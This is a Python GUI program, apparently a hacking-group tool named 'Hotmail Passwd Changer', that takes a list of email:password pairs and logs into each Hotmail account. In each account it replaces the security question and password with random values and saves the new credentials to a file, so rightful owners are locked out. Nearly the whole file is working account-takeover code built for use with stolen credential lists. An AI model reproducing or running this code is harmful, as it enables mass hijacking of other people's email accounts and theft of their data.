#Coded By Venam

import wx
import mechanize
import threading
import re
import random
import platform
from wx.lib.anchors import LayoutAnchors
from wx.lib.pubsub import Publisher
import datetime
from cStringIO import StringIO
import time

operatingSystem=platform.system()
alpha = 'abcdefghijjklmnopqrstuvwxyz'
n=0
def timing(n,size):
    time = float(n)/size*100
    return "["+str(time)+"%]"

##############colors in terminal#########
class bcolors:
    if operatingSystem=='Linux':
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
    else:
        HEADER = ''
        OKBLUE = ''
        OKGREEN = ''
        WARNING = ''
        FAIL = ''
        ENDC = ''
###########end of colors in terminal#########

############cut file in many parts#############
def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out
############end of // cut file in many parts#############


##############Begining of class Hotmail passchanger###################
class hotmailchanger(threading.Thread):

    def __init__(self, id, emaillist, myfile):
        self.id = id
        self.emaillist = emaillist
        self.myfile = myfile
        self.running = False
        threading.Thread.__init__(self)


    #generates a random password
    def genrandom(self):
        x = random.randint(6,8)
        pw = ''
        for a in xrange(x):
            pw+=random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
        return pw
    #generates a browser


    def generatebrowser(self):
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_handle_gzip(True)
        br.addheaders = [('User-agent', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1 like Mac OS X; en-US) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3')]
        return br

    #change the password
    def changepass(self, emailpass):

        #it gets the email:pass and split it
        emailpass = emailpass.split(":")
        email = emailpass[0].lower()
        passwd = emailpass[1]

        self.br.open("https://maccount.live.com/ac/password.aspx")
        self.br.select_form(nr=0)
        self.br.form['PasswordTextBox'] = passwd

        newpass = self.genrandom()
        self.br.form['NewPasswordControl$PasswordTextBox'] = newpass
        self.br.form['NewPasswordControl$RetypePWDTextBox'] =newpass
        self.br.submit(label="Save")

        return newpass


    #change the security question
    def changesec(self, emailpass):

        #it gets the email:pass and split it
        emailpass = emailpass.split(":")
        email = emailpass[0].lower()
        passwd = emailpass[1]
        #now let's fill the forms
        self.br.open("https://maccount.live.com/ac/sqsa.aspx")
        self.br.select_form(nr=0)
        self.br.form['PasswordTextBox']=passwd
        myquest = str(random.randint(0,5))
        myans = self.genrandom()
        self.br.form['QuestionSelectionList']=[myquest]
        self.br.form['SecretAnswerTextBox'] = myans
        self.br.submit(label="Save")


    #Simply opens mail
    def open_mail(self,emailpass):

        #it gets the email:pass and split it
        emailpass = emailpass.split(":")
        email = emailpass[0].lower()
        passwd = emailpass[1]

        #now open the email and get to the info page
        self.br.open("https://mid.live.com/si/login.aspx?wa=wsignin1.0&rpsnv=11&ct=1338648316&rver=6.1.6206.0&wp=MBI&wreply=http%3a%2f%2fdu107w.dub107.mail.live.com%2fm%2f%3frru%3dinbox%26lc%3d1033%26mlc%3den-US&lc=1033&id=64855&mspco=1","__ET=&LoginTextBox="+email.replace('@','%40').lower()+"&PasswordTextBox="+passwd+"&SavePasswordCheckBox=0&PasswordSubmit=Sign+in")
        self.br.select_form(nr=0)

        self.br.form['LoginTextBox']=email.lower()
        self.br.form['PasswordTextBox']=passwd
        self.br.submit(label="Sign in")


    #main run function
    def run(self):
        for emailpass in self.emaillist:
            if emailpass.endswith("\n"):
                emailpass = emailpass[:-1]

            if emailpass.endswith("\r"):
                emailpass = emailpass[:-1]
            self.br = self.generatebrowser()

            #opens the email
            self.open_mail(emailpass)
            if 'information you entered is incorrect' in self.br.response().read():
                wx.MutexGuiEnter()
                Publisher().sendMessage("update", "Wrong Password")
                wx.MutexGuiLeave()
                continue

            #change the security question
            self.changesec(emailpass)

            #change pass
            newpass = self.changepass(emailpass)

            #it gets the email:pass and split it
            emailpass = emailpass.split(":")
            email = emailpass[0].lower()
            passwd = emailpass[1]

            #save the result
            if email not in open(self.myfile , 'r').read():
                open(self.myfile , 'a').write(email+":"+newpass+"\n")
            wx.MutexGuiEnter()
            Publisher().sendMessage("update", "password changed: "+email+":"+newpass+"")
            wx.MutexGuiLeave()

##############END     of class Hotmail pass changer###################


##################################create for GUI########################
def create(parent):
    return Frame(parent)

[wxID_FRAME, wxID_FRAMEBUTTONLIST, wxID_FRAMEBUTTONSAVE, wxID_FRAMEINFOSLABEL,
 wxID_FRAMELISTBOX1, wxID_FRAMELISTLABEL, wxID_FRAMEPANEL1,
 wxID_FRAMESAVELABEL, wxID_FRAMETITLELABEL, wxID_FRAMEBUTTONSTART, wxID_FRAMEBUTTONABOUT,
] = [wx.NewId() for _init_ctrls in range(11)]
#########################################################################


#########################begining of class of GUI######################
class Frame(wx.Frame):
    def _init_ctrls(self, prnt):

        wx.Frame.__init__(self, id=wxID_FRAME, name=u'Frame', parent=prnt,
              pos=wx.Point(423, 177), size=wx.Size(519, 300),
              style=wx.DEFAULT_FRAME_STYLE,
              title=u'Hotmail Passwd Changer - VenamTeam')
        self.SetClientSize(wx.Size(519, 300))

        self.panel1 = wx.Panel(id=wxID_FRAMEPANEL1, name='panel1', parent=self,
              pos=wx.Point(0, -8), size=wx.Size(519, 300),
              style=wx.TAB_TRAVERSAL)

        image_file = 'background.jpg'
        bmp = wx.Bitmap(image_file)
        ##FOR THE BG : (I changed the parent from self.panel1 => self.bitmap)
        self.bitmap = wx.StaticBitmap(self.panel1, wx.ID_ANY, bmp, (0, 0))

        ##labels
        self.listlabel = wx.StaticText(id=wxID_FRAMELISTLABEL,
              label=u'NO LIST!', name=u'listlabel', parent=self.panel1,
              pos=wx.Point(320, 46), size=wx.Size(60, 16), style=0)
        self.listlabel.SetForegroundColour((255,255,255))
        self.listlabel.SetBackgroundColour((255,255,255))

        self.infoslabel = wx.StaticText(id=wxID_FRAMEINFOSLABEL,
              label=u'INFOS : ', name=u'infoslabel', parent=self.panel1,
              pos=wx.Point(226, 109), size=wx.Size(58, 16), style=0)
        self.infoslabel.SetForegroundColour((255,255,255))
        self.infoslabel.SetBackgroundColour((21,21,21))

        self.titlelabel = wx.StaticText(id=wxID_FRAMETITLELABEL,
              label=u'Hotmail Passwd Changer - VenamTeam', name=u'titlelabel',
              parent=self.panel1, pos=wx.Point(128, 10), size=wx.Size(254, 19),
              style=0)
        self.titlelabel.SetFont(wx.Font(12, wx.SWISS, wx.NORMAL, wx.NORMAL,
              False, u'Verdana'))
        self.titlelabel.SetForegroundColour((255,255,255))
        self.titlelabel.SetBackgroundColour((21,21,21))

        self.savelabel = wx.StaticText(id=wxID_FRAMESAVELABEL,
              label=u'NO FILE TO SAVE TO', name=u'savelabel',
              parent=self.panel1, pos=wx.Point(318, 77), size=wx.Size(141, 16),
              style=0)
        self.savelabel.SetForegroundColour((255,255,255))
        self.savelabel.SetBackgroundColour((21,21,21))

        ##listbox
        self.listBox1 = wx.ListBox(choices=[], id=wxID_FRAMELISTBOX1,
              name='listBox1', parent=self.panel1, pos=wx.Point(8, 133),
              size=wx.Size(504, 136), style=0)

        ##buttons
        self.buttonList = wx.Button(id=wxID_FRAMEBUTTONLIST,
              label=u'Select A List', name=u'buttonList', parent=self.panel1,
              pos=wx.Point(15, 41), size=wx.Size(265, 28), style=0)
        self.buttonList.SetForegroundColour((255,255,255))
        self.buttonList.SetBackgroundColour((21,21,21))
        self.buttonList.Bind(wx.EVT_BUTTON, self.Onlistbutton)

        self.buttonSave = wx.Button(id=wxID_FRAMEBUTTONSAVE,
              label=u'Where to Save', name=u'buttonSave', parent=self.panel1,
              pos=wx.Point(16, 72), size=wx.Size(264, 28), style=0)
        self.buttonSave.SetForegroundColour((255,255,255))
        self.buttonSave.SetBackgroundColour((21,21,21))
        self.buttonSave.Bind(wx.EVT_BUTTON, self.Onsavebutton)

        #####START BUTTON HERE####
        self.buttonStart = wx.Button(id=wxID_FRAMEBUTTONSTART,
              label=u'Start', name=u'buttonSave', parent=self.panel1,
              pos=wx.Point(215, 272), size=wx.Size(100, 28), style=0)
        self.buttonStart.SetForegroundColour((255,255,255))
        self.buttonStart.SetBackgroundColour((21,21,21))
        self.buttonStart.Bind(wx.EVT_BUTTON, self.Onstart)

        self.buttonabout = wx.Button(id=wxID_FRAMEBUTTONABOUT,
              label=u'About', name=u'buttonSave', parent=self.panel1,
              pos=wx.Point(444, 272), size=wx.Size(60, 28), style=0)
        self.buttonabout.SetForegroundColour((255,255,255))
        self.buttonabout.SetBackgroundColour((21,21,21))
        self.buttonabout.Bind(wx.EVT_BUTTON, self.ONaboutbutton)

    def __init__(self, parent):
        self._init_ctrls(parent)
        #Handle thing going in the logs box
        Publisher().subscribe(self.updateList, "update")
        self.emaillist = ""
        self.wheretosave = ""

    ####update the listbox with time and the msg
    def updateList(self, result):
        try:
            now = datetime.datetime.now()
            self.listBox1.AppendAndEnsureVisible("{0:<1}{1}".format(now.strftime("[%H:%M:%S]") , result.data))
        except wx.PyDeadObjectError:
            sys.exit(0)

    ######---Start events/actions handlers---######
    def ONaboutbutton(self,event):
        d= wx.MessageDialog( self, "This Program was coded by Venam (aka raptor)\n\nEnjoy!","Infos", wx.OK)
        #create msg wth ok button
        d.ShowModal() #show it
        d.Destroy() #destroy it when finished

    #on save to button
    def Onlistbutton(self,event):
        dialog = wx.FileDialog ( None, style = wx.OPEN )
        # Show the dialog and get user input
        if dialog.ShowModal() == wx.ID_OK:
            self.listlabel.SetForegroundColour((0,226,0))
            self.listlabel.SetBackgroundColour((21,21,21))
            self.listlabel.SetLabel(u'Email list selected')

            self.emaillist = dialog.GetPath()
            Publisher().sendMessage("update",  "Emails list: "+self.emaillist)
            self.Update()
        # The user did not select anything
        else:
            self.listlabel.SetForegroundColour((226,0,0))
            self.listlabel.SetBackgroundColour((21,21,21))
            self.listlabel.SetLabel(u'Please select an email list')
            self.emaillist = ""
            Publisher().sendMessage("update",  "Emails list: "+self.emaillist)
            self.Update()
        # Destroy the dialog
        dialog.Destroy()

    #Ontosavetobutton
    def Onsavebutton(self,event):
        dialog = wx.FileDialog ( None, style = wx.OPEN )
        # Show the dialog and get user input
        if dialog.ShowModal() == wx.ID_OK:
            self.savelabel.SetForegroundColour((0,226,0))
            self.savelabel.SetBackgroundColour((21,21,21))
            self.savelabel.SetLabel(u'File selected')
            self.wheretosave = dialog.GetPath()
            Publisher().sendMessage("update",  "Saving to: "+self.wheretosave)
            self.Update()
        # The user did not select anything
        else:
            self.savelabel.SetForegroundColour((226,0,0))
            self.savelabel.SetBackgroundColour((21,21,21))
            self.savelabel.SetLabel(u'Please select a file')
            self.wheretosave = ""
            Publisher().sendMessage("update",  "Saving to: "+self.wheretosave)
            self.Update()
        # Destroy the dialog
        dialog.Destroy()

    ##sart button
    def Onstart(self,event):

        emaillist = open(self.emaillist).readlines()

        myfile = self.wheretosave
        nbthread = int(open("config.data.txt",'r').read())
        z = chunkIt(emaillist, nbthread)
        for i, i2 in enumerate(z):
            Mythread = hotmailchanger(i,i2,myfile)
            Mythread.start()


############# END OF GUI #########################


############ MAIN LOOP ################
if __name__ == '__main__':
    app = wx.PySimpleApp()
    frame = create(None)
    frame.Show()

    app.MainLoop()
